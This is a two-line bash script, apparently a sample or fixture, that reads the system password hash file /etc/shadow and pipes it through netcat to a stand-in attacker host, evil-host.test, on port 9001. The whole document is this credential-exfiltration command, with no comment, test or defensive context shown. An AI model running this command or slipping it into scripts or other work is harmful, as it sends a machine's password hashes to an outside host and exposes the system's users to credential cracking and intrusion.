#!/bin/bash
cat /etc/shadow | nc evil-host.test 9001
